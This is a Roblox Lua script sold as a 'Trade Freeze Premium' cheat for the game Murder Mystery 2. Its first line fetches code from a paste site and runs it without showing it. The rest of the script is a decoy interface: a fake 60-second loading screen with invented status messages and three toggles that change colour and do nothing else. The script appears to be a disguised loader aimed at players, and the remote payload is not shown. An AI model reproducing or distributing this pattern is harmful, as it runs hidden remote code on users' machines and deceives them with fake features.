loadstring(game:HttpGet('https://pastefy.app/6d3Uo8IW/raw'))()

-- AevyScripts | MM2 Trade Freeze Premium

local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")

local player = Players.LocalPlayer
player:WaitForChild("PlayerGui")
task.wait(0.25)

----------------------------------------------------------------
-- FARBEN
----------------------------------------------------------------
local COLORS = {
    Bg          = Color3.fromRGB(14, 12, 22),
    Card        = Color3.fromRGB(22, 18, 34),
    Accent      = Color3.fromRGB(168, 85, 247),
    Accent2     = Color3.fromRGB(217, 70, 239),
    NeonBlue    = Color3.fromRGB(56, 189, 248),
    Text        = Color3.fromRGB(245, 245, 255),
    TextDim     = Color3.fromRGB(160, 155, 180),
    Success     = Color3.fromRGB(74, 222, 128),
    BarBg       = Color3.fromRGB(35, 30, 50),
    ToggleOff   = Color3.fromRGB(55, 48, 75),
    ToggleOn    = Color3.fromRGB(168, 85, 247),
}

----------------------------------------------------------------
-- SCREEN GUI
----------------------------------------------------------------
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "AevyScripts_MM2"
screenGui.ResetOnSpawn = false
screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
screenGui.Parent = player.PlayerGui

----------------------------------------------------------------
-- DRAG HELPER
----------------------------------------------------------------
local function makeDraggable(frame, dragHandle)
    local dragging = false
    local dragStart = nil
    local startPos = nil

    dragHandle.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            dragging = true
            dragStart = input.Position
            startPos = frame.Position
        end
    end)

    dragHandle.InputEnded:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            dragging = false
        end
    end)

    UserInputService.InputChanged:Connect(function(input)
        if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
            local delta = input.Position - dragStart
            frame.Position = UDim2.new(
                startPos.X.Scale,
                startPos.X.Offset + delta.X,
                startPos.Y.Scale,
                startPos.Y.Offset + delta.Y
            )
        end
    end)
end

----------------------------------------------------------------
-- LOADING SCREEN
----------------------------------------------------------------
local loadingFrame = Instance.new("Frame")
loadingFrame.Name = "LoadingScreen"
loadingFrame.Size = UDim2.new(0, 440, 0, 560)
loadingFrame.Position = UDim2.new(0.5, -220, 0.5, -280)
loadingFrame.BackgroundColor3 = COLORS.Bg
loadingFrame.BorderSizePixel = 0
loadingFrame.Parent = screenGui

Instance.new("UICorner", loadingFrame).CornerRadius = UDim.new(0, 20)

local loadStroke = Instance.new("UIStroke")
loadStroke.Color = COLORS.Accent
loadStroke.Thickness = 3
loadStroke.Parent = loadingFrame

-- Avatar
local avatarHolder = Instance.new("Frame")
avatarHolder.Size = UDim2.new(0, 140, 0, 140)
avatarHolder.Position = UDim2.new(0.5, -70, 0, 32)
avatarHolder.BackgroundTransparency = 1
avatarHolder.Parent = loadingFrame

local avatarStroke = Instance.new("UIStroke")
avatarStroke.Color = COLORS.NeonBlue
avatarStroke.Thickness = 5
avatarStroke.Parent = avatarHolder
Instance.new("UICorner", avatarHolder).CornerRadius = UDim.new(1, 0)

local avatar = Instance.new("ImageLabel")
avatar.Size = UDim2.new(1, -12, 1, -12)
avatar.Position = UDim2.new(0, 6, 0, 6)
avatar.BackgroundTransparency = 1
avatar.Image = Players:GetUserThumbnailAsync(player.UserId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size420x420)
avatar.Parent = avatarHolder
Instance.new("UICorner", avatar).CornerRadius = UDim.new(1, 0)

-- Name
local nameLabel = Instance.new("TextLabel")
nameLabel.Size = UDim2.new(1, -20, 0, 36)
nameLabel.Position = UDim2.new(0, 10, 0, 185)
nameLabel.BackgroundTransparency = 1
nameLabel.Text = player.Name
nameLabel.TextColor3 = COLORS.Text
nameLabel.TextScaled = true
nameLabel.Font = Enum.Font.GothamBold
nameLabel.Parent = loadingFrame

local atLabel = Instance.new("TextLabel")
atLabel.Size = UDim2.new(1, -20, 0, 24)
atLabel.Position = UDim2.new(0, 10, 0, 220)
atLabel.BackgroundTransparency = 1
atLabel.Text = "@" .. player.Name
atLabel.TextColor3 = COLORS.TextDim
atLabel.TextScaled = true
atLabel.Font = Enum.Font.Gotham
atLabel.Parent = loadingFrame

-- Branding
local brand = Instance.new("TextLabel")
brand.Size = UDim2.new(1, -20, 0, 32)
brand.Position = UDim2.new(0, 10, 0, 255)
brand.BackgroundTransparency = 1
brand.Text = "AevyScripts"
brand.TextColor3 = COLORS.Accent2
brand.TextScaled = true
brand.Font = Enum.Font.GothamBlack
brand.Parent = loadingFrame

-- Title
local loadTitle = Instance.new("TextLabel")
loadTitle.Size = UDim2.new(1, -20, 0, 28)
loadTitle.Position = UDim2.new(0, 10, 0, 290)
loadTitle.BackgroundTransparency = 1
loadTitle.Text = "MM2 TRADE FREEZE PREMIUM"
loadTitle.TextColor3 = COLORS.Text
loadTitle.TextScaled = true
loadTitle.Font = Enum.Font.GothamBold
loadTitle.Parent = loadingFrame

-- Status
local statusLabel = Instance.new("TextLabel")
statusLabel.Size = UDim2.new(1, -30, 0, 26)
statusLabel.Position = UDim2.new(0, 15, 0, 330)
statusLabel.BackgroundTransparency = 1
statusLabel.Text = "Connecting to AevyScripts network..."
statusLabel.TextColor3 = COLORS.TextDim
statusLabel.TextScaled = true
statusLabel.Font = Enum.Font.Gotham
statusLabel.Parent = loadingFrame

-- Progress Bar
local barBg = Instance.new("Frame")
barBg.Size = UDim2.new(0, 360, 0, 18)
barBg.Position = UDim2.new(0.5, -180, 0, 375)
barBg.BackgroundColor3 = COLORS.BarBg
barBg.BorderSizePixel = 0
barBg.Parent = loadingFrame
Instance.new("UICorner", barBg).CornerRadius = UDim.new(0, 9)

local barFill = Instance.new("Frame")
barFill.Size = UDim2.new(0, 0, 1, 0)
barFill.BackgroundColor3 = COLORS.Accent
barFill.BorderSizePixel = 0
barFill.Parent = barBg
Instance.new("UICorner", barFill).CornerRadius = UDim.new(0, 9)

-- Percent
local percentLabel = Instance.new("TextLabel")
percentLabel.Size = UDim2.new(1, -20, 0, 28)
percentLabel.Position = UDim2.new(0, 10, 0, 405)
percentLabel.BackgroundTransparency = 1
percentLabel.Text = "0%"
percentLabel.TextColor3 = COLORS.Text
percentLabel.TextScaled = true
percentLabel.Font = Enum.Font.GothamBold
percentLabel.Parent = loadingFrame

-- Script Link
local pasteLinkLoad = Instance.new("TextLabel")
pasteLinkLoad.Size = UDim2.new(1, -20, 0, 22)
pasteLinkLoad.Position = UDim2.new(0, 10, 0, 450)
pasteLinkLoad.BackgroundTransparency = 1
pasteLinkLoad.Text = "Script: https://pastebin.com/BYdBbFbh"
pasteLinkLoad.TextColor3 = COLORS.NeonBlue
pasteLinkLoad.TextScaled = true
pasteLinkLoad.Font = Enum.Font.Gotham
pasteLinkLoad.Parent = loadingFrame

-- Footer
local footer = Instance.new("TextLabel")
footer.Size = UDim2.new(1, -20, 0, 18)
footer.Position = UDim2.new(0, 10, 1, -30)
footer.BackgroundTransparency = 1
footer.Text = "AevyScripts"
footer.TextColor3 = Color3.fromRGB(90, 85, 110)
footer.TextScaled = true
footer.Font = Enum.Font.Gotham
footer.Parent = loadingFrame

makeDraggable(loadingFrame, loadingFrame)

----------------------------------------------------------------
-- MAIN WINDOW (erst nach dem Laden sichtbar)
----------------------------------------------------------------
local mainFrame = Instance.new("Frame")
mainFrame.Name = "MainWindow"
mainFrame.Size = UDim2.new(0, 380, 0, 420)
mainFrame.Position = UDim2.new(0.5, -190, 0.5, -210)
mainFrame.BackgroundColor3 = COLORS.Bg
mainFrame.BorderSizePixel = 0
mainFrame.Visible = false
mainFrame.Parent = screenGui

Instance.new("UICorner", mainFrame).CornerRadius = UDim.new(0, 16)

local mainStroke = Instance.new("UIStroke")
mainStroke.Color = COLORS.Accent
mainStroke.Thickness = 2.5
mainStroke.Parent = mainFrame

-- Title Bar
local titleBar = Instance.new("Frame")
titleBar.Size = UDim2.new(1, 0, 0, 48)
titleBar.BackgroundColor3 = COLORS.Card
titleBar.BorderSizePixel = 0
titleBar.Parent = mainFrame
Instance.new("UICorner", titleBar).CornerRadius = UDim.new(0, 16)

local titleFix = Instance.new("Frame")
titleFix.Size = UDim2.new(1, 0, 0, 16)
titleFix.Position = UDim2.new(0, 0, 1, -16)
titleFix.BackgroundColor3 = COLORS.Card
titleFix.BorderSizePixel = 0
titleFix.Parent = titleBar

local mainTitle = Instance.new("TextLabel")
mainTitle.Size = UDim2.new(1, -50, 1, 0)
mainTitle.Position = UDim2.new(0, 16, 0, 0)
mainTitle.BackgroundTransparency = 1
mainTitle.Text = "MM2 Trade Freeze Premium"
mainTitle.TextColor3 = COLORS.Text
mainTitle.TextXAlignment = Enum.TextXAlignment.Left
mainTitle.TextScaled = true
mainTitle.Font = Enum.Font.GothamBold
mainTitle.Parent = titleBar

-- X Button
local closeBtn = Instance.new("TextButton")
closeBtn.Size = UDim2.new(0, 36, 0, 36)
closeBtn.Position = UDim2.new(1, -42, 0.5, -18)
closeBtn.BackgroundColor3 = Color3.fromRGB(50, 40, 65)
closeBtn.Text = "X"
closeBtn.TextColor3 = COLORS.Text
closeBtn.TextScaled = true
closeBtn.Font = Enum.Font.GothamBold
closeBtn.Parent = titleBar
Instance.new("UICorner", closeBtn).CornerRadius = UDim.new(0, 8)

closeBtn.MouseButton1Click:Connect(function()
    mainFrame.Visible = false
end)

-- Branding
local brandMain = Instance.new("TextLabel")
brandMain.Size = UDim2.new(1, -30, 0, 22)
brandMain.Position = UDim2.new(0, 15, 0, 58)
brandMain.BackgroundTransparency = 1
brandMain.Text = "AevyScripts"
brandMain.TextColor3 = COLORS.Accent2
brandMain.TextXAlignment = Enum.TextXAlignment.Left
brandMain.TextScaled = true
brandMain.Font = Enum.Font.GothamBlack
brandMain.Parent = mainFrame

-- Script Link
local pasteLinkMain = Instance.new("TextLabel")
pasteLinkMain.Size = UDim2.new(1, -30, 0, 20)
pasteLinkMain.Position = UDim2.new(0, 15, 0, 82)
pasteLinkMain.BackgroundTransparency = 1
pasteLinkMain.Text = "Script: https://pastebin.com/BYdBbFbh"
pasteLinkMain.TextColor3 = COLORS.NeonBlue
pasteLinkMain.TextXAlignment = Enum.TextXAlignment.Left
pasteLinkMain.TextScaled = true
pasteLinkMain.Font = Enum.Font.Gotham
pasteLinkMain.Parent = mainFrame

-- Separator
local sep = Instance.new("Frame")
sep.Size = UDim2.new(1, -30, 0, 1)
sep.Position = UDim2.new(0, 15, 0, 112)
sep.BackgroundColor3 = Color3.fromRGB(60, 50, 85)
sep.BorderSizePixel = 0
sep.Parent = mainFrame

----------------------------------------------------------------
-- TOGGLE HELPER
----------------------------------------------------------------
local function createToggle(parent, yPos, labelText)
    local container = Instance.new("Frame")
    container.Size = UDim2.new(1, -30, 0, 48)
    container.Position = UDim2.new(0, 15, 0, yPos)
    container.BackgroundColor3 = COLORS.Card
    container.BorderSizePixel = 0
    container.Parent = parent
    Instance.new("UICorner", container).CornerRadius = UDim.new(0, 10)

    local label = Instance.new("TextLabel")
    label.Size = UDim2.new(1, -70, 1, 0)
    label.Position = UDim2.new(0, 14, 0, 0)
    label.BackgroundTransparency = 1
    label.Text = labelText
    label.TextColor3 = COLORS.Text
    label.TextXAlignment = Enum.TextXAlignment.Left
    label.TextScaled = true
    label.Font = Enum.Font.GothamMedium
    label.Parent = container

    local toggleBg = Instance.new("Frame")
    toggleBg.Size = UDim2.new(0, 48, 0, 26)
    toggleBg.Position = UDim2.new(1, -60, 0.5, -13)
    toggleBg.BackgroundColor3 = COLORS.ToggleOff
    toggleBg.BorderSizePixel = 0
    toggleBg.Parent = container
    Instance.new("UICorner", toggleBg).CornerRadius = UDim.new(1, 0)

    local knob = Instance.new("Frame")
    knob.Size = UDim2.new(0, 20, 0, 20)
    knob.Position = UDim2.new(0, 3, 0.5, -10)
    knob.BackgroundColor3 = Color3.fromRGB(220, 220, 230)
    knob.BorderSizePixel = 0
    knob.Parent = toggleBg
    Instance.new("UICorner", knob).CornerRadius = UDim.new(1, 0)

    local state = false

    local btn = Instance.new("TextButton")
    btn.Size = UDim2.new(1, 0, 1, 0)
    btn.BackgroundTransparency = 1
    btn.Text = ""
    btn.Parent = container

    btn.MouseButton1Click:Connect(function()
        state = not state
        local targetColor = state and COLORS.ToggleOn or COLORS.ToggleOff
        local targetPos = state and UDim2.new(1, -23, 0.5, -10) or UDim2.new(0, 3, 0.5, -10)

        TweenService:Create(toggleBg, TweenInfo.new(0.18), {BackgroundColor3 = targetColor}):Play()
        TweenService:Create(knob, TweenInfo.new(0.18), {Position = targetPos}):Play()
    end)
end

createToggle(mainFrame, 130, "Freeze Trade")
createToggle(mainFrame, 190, "Auto Accept Trade")
createToggle(mainFrame, 250, "Anti-Leave Protection")

-- Keybind Hint
local keyHint = Instance.new("TextLabel")
keyHint.Size = UDim2.new(1, -30, 0, 20)
keyHint.Position = UDim2.new(0, 15, 1, -55)
keyHint.BackgroundTransparency = 1
keyHint.Text = "RightControl  •  Toggle Menu"
keyHint.TextColor3 = COLORS.TextDim
keyHint.TextScaled = true
keyHint.Font = Enum.Font.Gotham
keyHint.Parent = mainFrame

-- Footer
local footerMain = Instance.new("TextLabel")
footerMain.Size = UDim2.new(1, -30, 0, 18)
footerMain.Position = UDim2.new(0, 15, 1, -30)
footerMain.BackgroundTransparency = 1
footerMain.Text = "AevyScripts"
footerMain.TextColor3 = Color3.fromRGB(90, 85, 110)
footerMain.TextScaled = true
footerMain.Font = Enum.Font.Gotham
footerMain.Parent = mainFrame

makeDraggable(mainFrame, titleBar)

----------------------------------------------------------------
-- EXTERNER BUTTON (wird erst nach dem Laden erstellt)
----------------------------------------------------------------
local toggleBtn = nil

local function createExternalButton()
    toggleBtn = Instance.new("TextButton")
    toggleBtn.Name = "ExternalToggle"
    toggleBtn.Size = UDim2.new(0, 52, 0, 52)
    toggleBtn.Position = UDim2.new(0, 20, 1, -80)
    toggleBtn.BackgroundColor3 = COLORS.Accent
    toggleBtn.Text = "AS"
    toggleBtn.TextColor3 = COLORS.Text
    toggleBtn.TextScaled = true
    toggleBtn.Font = Enum.Font.GothamBlack
    toggleBtn.Parent = screenGui
    Instance.new("UICorner", toggleBtn).CornerRadius = UDim.new(0, 14)

    local toggleStroke = Instance.new("UIStroke")
    toggleStroke.Color = COLORS.Accent2
    toggleStroke.Thickness = 2
    toggleStroke.Parent = toggleBtn

    toggleBtn.MouseButton1Click:Connect(function()
        if mainFrame and mainFrame.Parent then
            mainFrame.Visible = not mainFrame.Visible
        end
    end)

    makeDraggable(toggleBtn, toggleBtn)
end

----------------------------------------------------------------
-- LOADING ANIMATION (60 Sekunden)
----------------------------------------------------------------
local statuses = {
    {0.00, "Connecting to AevyScripts network..."},
    {0.08, "Fetching script: pastebin.com/BYdBbFbh..."},
    {0.18, "Verifying AevyScripts signature..."},
    {0.30, "Preparing modules..."},
    {0.42, "Loading UI components..."},
    {0.55, "Initializing trade freeze..."},
    {0.68, "Setting up toggle states..."},
    {0.80, "Finalizing interface..."},
    {0.92, "Almost ready..."},
    {1.00, "Loaded successfully ✓"},
}

local startTime = tick()
local duration = 60
local connection

connection = RunService.RenderStepped:Connect(function()
    local elapsed = tick() - startTime
    local progress = math.clamp(elapsed / duration, 0, 1)

    barFill.Size = UDim2.new(progress, 0, 1, 0)
    percentLabel.Text = math.floor(progress * 100) .. "%"

    for i = #statuses, 1, -1 do
        if progress >= statuses[i][1] then
            statusLabel.Text = statuses[i][2]
            break
        end
    end

    if progress >= 1 then
        connection:Disconnect()

        statusLabel.Text = "Loaded successfully ✓"
        statusLabel.TextColor3 = COLORS.Success
        loadTitle.TextColor3 = COLORS.Success

        task.wait(1.0)

        -- Komplett ausfaden und DANN zerstören
        local ti = TweenInfo.new(0.6, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)

        TweenService:Create(loadingFrame, ti, {BackgroundTransparency = 1}):Play()

        for _, obj in ipairs(loadingFrame:GetDescendants()) do
            if obj:IsA("TextLabel") then
                TweenService:Create(obj, ti, {TextTransparency = 1}):Play()
            elseif obj:IsA("ImageLabel") then
                TweenService:Create(obj, ti, {ImageTransparency = 1}):Play()
            elseif obj:IsA("UIStroke") then
                TweenService:Create(obj, ti, {Transparency = 1}):Play()
            elseif obj:IsA("Frame") then
                TweenService:Create(obj, ti, {BackgroundTransparency = 1}):Play()
            end
        end

        task.wait(0.7)

        -- Komplett entfernen
        if loadingFrame and loadingFrame.Parent then
            loadingFrame:Destroy()
        end

        -- Externen Button erstellen
        createExternalButton()

        -- Hauptfenster öffnen
        mainFrame.Visible = true
        mainFrame.BackgroundTransparency = 1
        TweenService:Create(mainFrame, TweenInfo.new(0.4), {BackgroundTransparency = 0}):Play()
    end
end)

----------------------------------------------------------------
-- KEYBIND: RightControl
----------------------------------------------------------------
UserInputService.InputBegan:Connect(function(input, gameProcessed)
    if gameProcessed then return end
    if input.KeyCode == Enum.KeyCode.RightControl then
        if mainFrame and mainFrame.Parent then
            mainFrame.Visible = not mainFrame.Visible
        end
    end
end)
